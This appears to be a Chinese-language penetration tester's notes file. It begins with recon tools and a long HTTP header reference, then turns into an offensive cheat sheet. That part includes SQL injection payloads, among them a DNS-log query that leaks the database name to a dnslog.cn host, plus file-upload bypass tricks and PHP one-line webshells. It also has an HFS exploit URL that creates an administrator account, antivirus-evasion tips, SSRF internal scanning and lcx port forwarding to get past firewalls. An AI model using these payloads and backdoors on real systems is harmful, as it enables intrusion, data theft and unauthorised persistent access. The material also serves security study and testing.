# 工具箱

whois
crt.sh --- 证书信息搜集 子域名搜集

[工具脚本集合](uedbox.com/tools/type/webapp
)

nslookup 超级ping
vulmap
fuckcdn github

otype=3
JSFinder

get-executionpolicy
nishang framework

## website

[base64解码](http://base64.supfree.net/)

[黑伞攻防-http-headers](https://cloud.tencent.com/developer/article/1522129)

HTTP标头使客户端和服务器可以通过HTTP请求或响应传递其他信息。HTTP标头由不区分大小写的名称，后跟冒号（:）和值组成。 值之前的空格将被忽略。

自定义专有标头历来都使用X-前缀，但是由于在RFC 6648中非标准字段成为标准字段时带来的不便，该约定在2012年6月被弃用；其他的列在IANA注册中心中，其原始内容在RFC 4229中定义。IANA还维护建议的新HTTP标头的注册表。

标题可以根据其上下文进行分组：

常规标头适用于请求和响应，但与正文中传输的数据无关。
请求标头包含有关要获取的资源或有关请求资源的客户端的更多信息。
响应标头包含有关响应的其他信息，例如响应的位置或提供响应的服务器。
实体标头包含有关资源主体的信息，例如其内容长度或MIME类型。
标头也可以根据代理处理方式进行分组：

Connection
Keep-Alive
Proxy-Authenticate
Proxy-Authorization
TE
Trailer
Transfer-Encoding
Upgrade。
端到端头

这些标头必须发送给消息的最终接收者：请求的服务器，或响应的客户端。中间代理必须重新传输未经修改的标头，并且缓存必须存储它们。

逐跳标题

这些标头仅对单个传输级连接有意义，并且不得由代理重新传输或缓存。请注意，只能使用Connection常规标头设置逐跳标头。

认证方式

Section

WWW-Authenticate

定义用于访问资源的身份验证方法。

Authorization

包含用于通过服务器验证用户代理的凭据。

Proxy-Authenticate

定义用于访问代理服务器后方资源的身份验证方法。

Proxy-Authorization

包含用于通过代理服务器认证用户代理的凭据。

快取

Section

Age

对象位于代理缓存中的时间（以秒为单位）。

Cache-Control

请求和响应中的缓存机制的指令。

Clear-Site-Data

清除与请求网站关联的浏览数据（例如cookie，存储，缓存）。

Expires

响应被认为是过时的日期/时间。

Pragma

特定于实现的标头，可能在请求-响应链的任何地方产生各种影响。用于与HTTP / 1.0缓存（向后Cache-Control还不存在标头）的向后兼容性。

Warning

有关可能出现的问题的常规警告信息。

客户提示

Section

HTTP 客户端提示正在进行中。实际文档可以在HTTP工作组的网站上找到。

Accept-CH

服务器可以使用Accept-CH标头字段或<meta>具有http-equiv属性（[HTML5]）的等效HTML 元素来宣传对客户端提示的支持。

Accept-CH-Lifetime

服务器可以要求客户端记住该服务器在指定时间段内支持的一组客户端提示，以允许在对服务器源的后续请求中传递客户端提示（[RFC6454]）。

Early-Data

表示请求已在早期数据中传达。

Content-DPR

一个数字，指示所选图像响应的物理像素与CSS像素之间的比率。

DPR

一个数字，指示客户端当前的设备像素比率（DPR），即设备上布局视口（[CSS2]的第9.1.1节）的物理像素与CSS像素（[CSSVAL]的 5.2节）的比率。

Device-Memory

从技术上讲，它是设备内存API的一部分，此标头代表大约RAM客户端拥有的数量。

Save-Data

一个布尔值，指示用户代理对于减少数据使用量的偏好。

Viewport-Width

一个数字，以CSS像素表示布局视口的宽度。提供的像素值是四舍五入到最小的后续整数（即上限值）的数字。

如果Viewport-Width在消息中多次出现，则最后一个值将覆盖所有先前出现的值。

Width

的Width请求报头字段是一个数字，表示在物理像素所需的资源宽度（即图像的固有尺寸）。提供的像素值是四舍五入到最小的后续整数（即上限值）的数字。

如果在请求时未知所需的资源宽度，或者资源不具有显示宽度，Width则可以省略标题字段。如果Width消息中多次出现，则最后一个值将覆盖所有先前出现的值

有条件的

Section

Last-Modified

资源的最后修改日期，用于比较同一资源的多个版本。它的准确性不如ETag，但在某些环境中更易于计算。有条件的请求使用If-Modified-Since并If-Unmodified-Since使用此值来更改请求的行为。

ETag

标识资源版本的唯一字符串。有条件的请求使用If-Match并If-None-Match使用此值来更改请求的行为。

If-Match

使请求成为条件，并且仅在存储的资源与给定ETag之一匹配时才应用该方法。

If-None-Match

使请求成为条件，仅在存储的资源与任何给定的ETag 不匹配时才应用该方法。这用于更新缓存（用于安全请求），或用于防止已经存在的新资源上载。

If-Modified-Since

使请求成为条件请求，并期望仅在给定日期之后对实体进行修改的情况下才发送实体。仅当高速缓存已过期时才用于传输数据。

If-Unmodified-Since

使请求成为条件请求，并期望仅在给定日期之后未修改实体的情况下才发送实体。这样可以确保特定范围的新片段与先前片段的一致性，或者在修改现有文档时实现乐观的并发控制系统。

Vary

确定如何匹配请求标头，以决定是否可以使用缓存的响应，而不是从原始服务器请求新的响应。

连接管理

Section

Connection

控制当前事务完成后网络连接是否保持打开状态。

Keep-Alive

控制持久连接应保持打开状态的时间。

内容协商

Section

Accept

通知服务器有关可以发送回的数据类型。

Accept-Charset

客户可以理解哪种字符编码。

Accept-Encoding

可以对发送回的资源使用编码算法，通常是压缩算法。

Accept-Language

通知服务器有关服务器预期发送回的语言。这只是一个提示，并不一定要在用户的完全控制下：服务器应始终注意不要覆盖明确的用户选择（例如从下拉菜单中选择语言）。

控制项

Section

Expect

指示服务器正确处理请求需要满足的期望。

Max-Forwards

饼干

Section

Cookie

包含服务器先前发送的带有头的已存储HTTP cookieSet-Cookie。

Set-Cookie

将cookie从服务器发送到用户代理。

Cookie2

包含先前由服务器发送的带有Set-Cookie2标头的HTTP cookie ，但已被废弃。使用Cookie代替。

Set-Cookie2

将cookie从服务器发送到用户代理，但已被废弃。使用Set-Cookie代替。

CORS

Section

在此处了解有关CORS的更多信息。

Access-Control-Allow-Origin

指示是否可以共享响应。

Access-Control-Allow-Credentials

指示当凭据标志为true时是否可以公开对请求的响应。

Access-Control-Allow-Headers

用于响应预检请求，以指示发出实际请求时可以使用哪些HTTP标头。

Access-Control-Allow-Methods

指定在响应预检请求而访问资源时允许的方法。

Access-Control-Expose-Headers

通过列出标题的名称来指示哪些标题可以作为响应的一部分公开。

Access-Control-Max-Age

指示可以将预检请求的结果缓存多长时间。

Access-Control-Request-Headers

在发出预检请求时使用，以使服务器知道发出实际请求时将使用哪些HTTP标头。

Access-Control-Request-Method

在发出预检请求时使用，以使服务器知道在发出实际请求时将使用哪种HTTP方法。

Origin

指示提取的来源。

Service-Worker-Allowed

通过在Service Worker脚本的响应中包含此标头来消除路径限制。

Timing-Allow-Origin

指定允许查看通过Resource Timing API功能检索的属性值的原点，否则，由于跨域限制，该原点将报告为零。

X-Permitted-Cross-Domain-Policies

指定是否crossdomain.xml允许跨域策略文件（）。该文件可以定义一个策略，以授予客户端（例如Adobe的Flash Player，Adobe Acrobat，Microsoft Silverlight或Apache Flex）跨域处理数据的权限，否则该域将受到同源策略的限制。有关 更多信息，请参见跨域策略文件规范。

不跟踪

Section

DNT

表示用户的跟踪首选项。

Tk

指示相应响应的跟踪状态。

资料下载

Section

Content-Disposition

指示传输的资源是应该内联显示（不带标题的默认行为），还是应该像下载一样进行处理，浏览器应显示“另存为”对话框。

邮件正文信息

Section

Content-Length

资源的大小，以十进制字节数表示。

Content-Type

指示资源的媒体类型。

Content-Encoding

用于指定压缩算法。

Content-Language

描述用于受众的人类语言，以便它允许用户根据用户自己的首选语言进行区分。

Content-Location

指示返回数据的备用位置。

代理人

Section

Forwarded

包含来自代理服务器面向客户端的信息，当请求路径中包含代理时，该信息会更改或丢失。

X-Forwarded-For

标识通过HTTP代理或负载平衡器连接到Web服务器的客户端的原始IP地址。

X-Forwarded-Host

标识请求客户端用于连接到您的代理或负载平衡器的原始主机。

X-Forwarded-Proto

标识客户端用来连接到代理或负载均衡器的协议（HTTP或HTTPS）。

Via

由代理（正向和反向代理）添加，并且可以出现在请求标头和响应标头中。

重新导向

Section

Location

指示将页面重定向到的URL。

请求上下文

Section

From

包含控制请求用户代理的人工用户的Internet电子邮件地址。

Host

指定服务器的域名（用于虚拟主机），以及（可选）服务器正在侦听的TCP端口号。

Referer

前一个网页的地址，从中指向当前请求页面的链接。

Referrer-Policy

控制在Referer标头中发送的引荐来源信息应包含在所提出的请求中。

User-Agent

包含一个特征字符串，该特征字符串使网络协议对等方可以识别请求软件用户代理的应用程序类型，操作系统，软件供应商或软件版本。另请参阅Firefox用户代理字符串参考。

响应上下文

Section

Allow

列出资源支持的HTTP请求方法集。

Server

包含有关原始服务器用于处理请求的软件的信息。

范围要求

Section

Accept-Ranges

指示服务器是否支持范围请求，如果支持，则以哪种单位表示范围。

Range

指示服务器应返回的文档部分。

If-Range

创建一个条件范围请求，该条件范围请求仅在给定的etag或日期与远程资源匹配时才得到满足。用于防止从资源的不兼容版本下载两个范围。

Content-Range

指示部分消息在全身消息中的位置。

安全

Section

Cross-Origin-Opener-Policy（COOP）

防止其他域打开/控制窗口。

Cross-Origin-Resource-Policy（CORP）

防止其他域读取应用此标头的资源的响应。

Content-Security-Policy（CSP）

控制允许用户代理为给定页面加载的资源。

Content-Security-Policy-Report-Only

允许Web开发人员通过监视（但不强制执行）效果来试验策略。这些违规报告包含通过HTTP 请求发送到指定URI 的JSON文档POST。

Expect-CT

允许站点选择报告和/或强制执行证书透明性要求，从而防止不注意该站点使用错误发行的证书的情况。当网站启用Expect-CT标头时，他们会要求Chrome浏览器检查该网站的任何证书是否出现在公共CT日志中。

Feature-Policy

提供一种机制，以允许和拒绝在其自己的框架以及嵌入的iframe中使用浏览器功能。

Public-Key-Pins（HPKP）

将特定的加密公共密钥与某个Web服务器关联，以降低使用伪造证书进行MITM攻击的风险。

Public-Key-Pins-Report-Only

将报告发送到标头中指定的report-uri，即使违反固定，仍允许客户端连接到服务器。

Strict-Transport-Security（HSTS）

强制使用HTTPS而不是HTTP进行通信。

Upgrade-Insecure-Requests

向服务器发送一个信号，以表示客户机对加密和认证响应的偏好，并且可以成功处理该upgrade-insecure-requests指令。

X-Content-Type-Options

禁用MIME嗅探，并强制浏览器使用中提供的类型Content-Type。

X-Download-Options

指示浏览器（Internet Explorer）不应显示“打开”从应用程序下载的文件的选项，以防止网络钓鱼攻击，否则该文件将获得在应用程序上下文中执行的访问权限。

X-Frame-Options （XFO）

指示浏览器是否应该被允许在渲染页面<frame>，<iframe>，<embed>或<object>。

X-Powered-By

可以由托管环境或其他框架来设置，并包含有关它们的信息，而不会为应用程序或其访问者提供任何有用的信息。取消设置此标头，以避免暴露潜在的漏洞。

X-XSS-Protection

启用跨站点脚本过滤。

服务器发送的事件

Section

Last-Event-ID

...

NEL

定义一种机制，使开发人员可以声明网络错误报告策略。

Ping-From

...

Ping-To

...

Report-To

用于指定浏览器向其发送警告和错误报告的服务器端点。

转移编码

Section

Transfer-Encoding

指定用于将实体安全地传输给用户的编码形式。

TE

指定用户代理愿意接受的传输编码。

Trailer

允许发件人在分块消息的末尾包括其他字段。

Web套接字

Section

Sec-WebSocket-Key

...

Sec-WebSocket-Extensions

...

Sec-WebSocket-Accept

...

Sec-WebSocket-Protocol

...

Sec-WebSocket-Version

...

其他

Section

Accept-Push-Policy

客户端可以通过在请求中发送Accept-Push-Policy标头字段来表达请求的推送策略。

Accept-Signature

客户端可以发送Accept-Signature标头字段以指示意图利用任何可用签名并指示其支持的签名类型。

Alt-Svc

用于列出获得此服务的替代方法。

Date

包含发起消息的日期和时间。

Large-Allocation

告诉浏览器正在加载的页面要执行大分配。

Link

的Link实体头字段提供了用于串行化在HTTP头中的一个或多个链接的装置。它在语义上等效于HTML <link>元素。

Push-Policy

A Push-Policy定义在处理请求时有关推送的服务器行为。

Retry-After

指示用户代理应在发出后续请求之前等待多长时间。

Signature

该Signature头域签名的名单交换，每个人的陪同下如何确定的权威和刷新签名信息。

Signed-Headers

的Signed-Headers报头字段标识响应的报头字段的有序列表中的签名包括。

Server-Timing

传达给定请求-响应周期的一个或多个度量标准和描述。

SourceMap

将生成的代码链接到源映射。

Upgrade

升级标头字段的相关RFC文档是RFC 7230的6.7节。该标准建立了在当前客户端，服务器，传输协议连接上升级或更改为其他协议的规则。例如，假设服务器决定确认并实现“升级”标头字段，则此标头标准允许客户端从HTTP 1.1更改为HTTP 2.0。双方均不需要接受“升级标题”字段中指定的条款。可以在客户端和服务器标头中使用它。如果指定了升级头字段，那么发送者还必须发送带有指定升级选项的连接头字段。有关Connection标头字段的详细信息，请参见上述RFC的6.1节。

X-DNS-Prefetch-Control

控制DNS预取，此功能使浏览器可以主动对用户可能选择遵循的两个链接以及文档引用的项目的URL（包括图像，CSS，JavaScript等）执行域名解析。

X-Firefox-Spdy

...

X-Pingback

...

X-Requested-With

...

X-Robots-Tag

用于指示如何在公共搜索引擎结果中为网页建立索引。标题实际上等效于<meta name="robots" content="...">。

X-UA-Compatible

Internet Explorer使用该信号来指示要使用哪种文档模式。

漏洞

========================================================================================================================================

SQL注入漏洞
    SQL注入漏洞是由于Web应用程序没有对用户输入数据的合法性进行判断，攻击者通过Web页面的输入区域(如URL、表单等) ，用精心构造的SQL语句插入特殊字符和指令，通过和数据库交互获得私密信息或者篡改数据库信息。攻击者可以利用SQL注入漏洞获得管理员权限，在网页上加挂木马和各种恶意程序，盗取企业和用户敏感信息。
命令执行漏洞
      命令执行漏洞是通过URL发起请求，在Web服务器端执行未授权的命令，获取系统信息，篡改系统配置，控制整个系统，使系统瘫痪等。
命令执行漏洞主要有两种情况：
     --通过目录遍历漏洞，访 问系统文件夹，执行指定的系统命令；
--攻击者提交特殊的字符或者命令，Web程序没有进行检测或者绕过Web应用程序过滤，把用户提交的请求作为指令进行解析，导致执行任意命令。
跨站脚本漏洞
    跨站脚本漏洞是因为Web应用程序时没有对用户提交的语句和变量进行过滤或限制，攻击者通过Web页面的输入区域向数据库或HTML页面中提交恶意代码，当用户打开有恶意代码的链接或页面时，恶意代码通过浏览器自动执行，从而达到攻击的目的。跨站脚本漏洞危害很大，尤其是目前被广泛使用的网络银行，通过跨站脚本漏洞攻击者可以冒充受害者访问用户重要账户，盗窃企业重要信息。
St2-045
Struts里是可以直接执行异常里的错误信息，那么在common upload file 组件的异常里是会把客户端传递的值作为错误信息返回
在FileUploadBase.java中，发现了一个方法
当content type不是以multipart/为头的时候，就会抛出异常，并且直接将客户端输入的信息，作为异常信息返回
<https://blog.csdn.net/raintungli/article/details/60787630>
Weblogic反序列化漏洞(CVE-2017-10271)
WorkContextXmlInputAdapter中，没有任何过滤就直接调用XMLDecoder方法，而XMLDecoder本身是用于将XML文件反序列成java的对象，因而造成的漏洞的发生。
归根结底，还是weblogic犯了编码上的错误，完全信任用户的输入，然后调用XMLDecoder进行反序列,导致了这个漏洞的发生
SSRF
SSRF（Server-Side Request Forgery, 服务端请求伪造）利用漏洞可以发起网络请求来攻击内网服务。
利用SSRF能实现以下效果:
1）        扫描内网（主机信息收集，Web应用指纹识别）
2）        根据所识别应用发送构造的Payload进行攻击
3）        Denial of service
防御方法：1,过滤返回信息，验证远程服务器对请求的响应；2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网
XXE
XXE是xml外部实体注入. 当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害
产生的危害
xxe危害1：读取任意文件 ；xxe危害2: 执行系统命令 ；xxe危害3：探测内网端口
xxe危害4：攻击内网网站 ；xxe危害5： 导致DOS攻击（著名的’billion laughs’）
防御方法：方式1： 使用开发语言提供的禁用外部实体的方法；方式2： 过滤用户提交的XML数据
文件上传
上传文件的时候，如果服务器脚本语言，未对上传的文件进行严格的验证和过滤，就容易造成上传任意文件，包括上传脚本文件。

## php

open_basedir
safe_mod

disable_functions

suid

## xss

防御 -- html实体化 &lt;

## xxe

file_get_contents
simplexml_load_string

## 数据库CVE

vulhub.org

## WAF绕过

Content-Disposition
filename
Content-Type
filename="x.php%00.jpg"
filename=php.php
"php.php
filename= ;filename="php.php"
filename="x.
p
h
p
"

## cc ?

## get post 区别 数据url编码

%00 -- get 
 00 -- post 

 a -- hex -- 61

## sql注入

- oracle 报错注入

select * from (select * from user_tab_columns where table_name='ADMIN') where n=2
**别名用于字段名**
select * from (select colunm_name, rownum n from user_tab_columns where table_name='ADMIN') where n = 2

and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1))-- 查询数据库版本
select banner from sys.v_$version where rownum=1 
select table_name from user_tables where rownum=1 查询表名
select column_name from user_tab_columns where table_name='ADMIN' and rownum=1

select column_name from user_tab_columns where table_name='ADMIN' and column_name<>'ID' and rownum=1 --查询第二个字段

注意转码 用了二进制类型
to_nchar --- 将varchar2 ---> nvarchar2 
datatype --- 时间戳类型

- MSSQL

union 去重
union 不会去重

- dns-log
unc
select load_file(concat('//', database(), '.vwsrjz.dnslog.cn/123'))
select load_file(concat('//', (select table_name from information_schema.tables where table_schema=database())))

1. 目标有网
2. linux 默认不自带smb
3. 数据库版本低，或配置文件改过 secure_file_priv=

oob的一种 --- 数据外带出来

url编码--- 16进制
宽字节编码--- gbk  ---- 传一个字符将\吃掉变成汉字  %df\  df5c
单字节 --- ascii

- 盲注
length(database())
substr(截取的内容，截取的位，截取的个数)
ascii(substr(database(),1,1)) > 1 --- 判断截取的数据库名的ascii  ***1-127***

length( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ) > 1 --- 限制子查询结果为1条

head 注入
UA REFERER X-FORWARDED-FOR

\ 转义字符绕过'过滤

insert into uagent ('uagent', 'username') values('' or sleep(10),1) -- qwe 保证字段数相等
sleep(10),1 ---- 对应 'uagent', 'username'
而不是sleep(10)

post注入   sqlmap -r 指定数据包

sqlmap   -u url
          --dbs 跑库名  -D 库名
--tables 跑表名 -T 表名
--columns 跑字段名 -c 字段
--dump 读数据
-显错注入-联合查询

1. 判断是否存在注入： and 1=1 and 1=2
2. 判断字段数：

 > order by 1 ---  第一字段排序 用来确认字段数
 > union select  --- 联合查询 前面字段和后面字段数要一致

 information_schema （mysql数据库5.0以上）
 information_schema.tables(记录表名信息的表)
 information_schema.columns(记录列名信息的表)
 table_name -- 表名
 column_name -- 列名
 table_schema -- 数据库名
 limit 0, 1 限制输出
 union select 1, database()
 union select 1, table_name from information_schema.tables where table_schema=database()
 union select 1, group_concat(column_table) from information_schema.columns where table_schema
> select database() --- 库名

%23a%0A是一种常见的SQL注释语法

%23表示字符#的URL编码形式，用于注释掉SQL语句中#后面的所有内容。这种方式也被称为"哈希注释"。
%0A表示换行符的URL编码形式，用于在SQL语句中插入一个新行，从而避免一些简单的换行符过滤器。这种方式也被称为"换行符注入"。
因此，将%23a%0A插入到SQL注入攻击负载中，可以将注入语句的后面部分注释掉，并在新行中插入后续攻击负载。例如，假设以下是一段受攻击的SQL查询语句：

SELECT * FROM users WHERE username = 'admin' AND password = '$password';
如果攻击者想要绕过该查询并获取所有用户数据，他们可以尝试使用以下攻击负载：

' or 1=1 %23a%0A UNION SELECT *FROM users--
在这个攻击负载中，%23a%0A将注释掉后面的AND password = '$password'部分，并在新行中插入攻击负载"UNION SELECT* FROM users--"。这个攻击负载将返回所有用户数据，因为它使用了UNION操作符来将攻击者的查询结果合并到原始查询结果中。

- 等价字符
 空格： %20 + () %0a %09 %a0 %0b %0c %0d /**/
 = : like regexp liker <> !=
 and : &&
 or: xor & ^ ||

## 一句话


<?php file_put_contents("1.php", "<?php eval($_REQUEST[9])?>")?>

1=assert&2=phpinfo();
<?php $_GET[1]($_GET[2])?>


## 文件上传

- .htaccess hypertext access 
ren 17.txt .htaccess -- 重命名
AddType application/x-httpd-php  .jpg --- .jpg 当做php解析

- 客户端
>
> 1. js检查
>
- 服务端

### 检查后缀

#### 黑名单

>  1. 上传特殊可解析后缀
>  2. 上传.htaccess
>  3. 后缀大小写绕过   windows文件和文件夹不区分大小写
>  4. 点绕过
>  5. 空格绕过   windows自动去后缀末尾空格
>  6. ::$DATA绕过   1.php::$DATA => 1.php  寄生文件 123.txt:1.php
>  7. 配合解析漏洞
   > 7.1 Apache陌生后缀解析漏洞
   > 7.2 Apache换行解析漏洞
 > 8. 双后缀名绕过
>
#### 白名单
>
>  1. MIME绕过
>  2. %00截断
>  3. 0x00截断
>
### 检查内容
>
>  1. 文件头检查
>  2. 突破getimagesize()
>  3. 突破exif_imagetype()
>  4. 二次渲染
>
### 代码逻辑
 >
 > 1.条件竞争

### IIS6.0  CGI

## 免杀

- 函数替换
- 自定义函数
- 回调函数
- 编码绕过
- 函数字符串拆分组合

[免杀-https://xz.aliyun.com/t/5152](https://xz.aliyun.com/t/5152 )

## 横向渗透

135批量抓鸡
arp欺骗-netfuke-kali arpspoof
 -内网渗透
  主机发现->存活主机(MAC,IP,计算机名)
  扫描主机-> port system 漏洞等
  攻击主机
  取得权限

## SSRF

**扫内网**
a : 192.168.38.129
b : 27.19.126.82 192.168.0.101
c : 192.168.0.106
a能链接b
b能链接c
a不能链接c
攻击者a访问： <http://192.168.0.101/ssrf/index.php?url=192.168.0.106:80>
通过b的ssrf漏洞去探针c的80端口 **192.168.0.1 ~ 192.168.0.255**

HFS命令执行
<http://127.0.0.1/?search==%00{.exec|cmd> /c net user DEF DEFHACKER123 /add.}
<http://127.0.0.1/?search==%00{.exec|cmd> /c net localgroup Administrators  DEF  /add.}

## 端口转发

实现数据连接 绕过防火墙
让内网主动将数据给到外网
a可以链接b b不能链接a
a充当内网地址 b充当外网地址

a 192.168.38.130
lcx.exe -slave 192.168.0.106 3333 127.0.0.1 3389
将本地的3389端口转发到192.168.0.106的3333端口上去

b 192.168.0.106
lcx.exe -listen 3333 1111
监听本地3333端口转发到1111
然后链接本地的1111
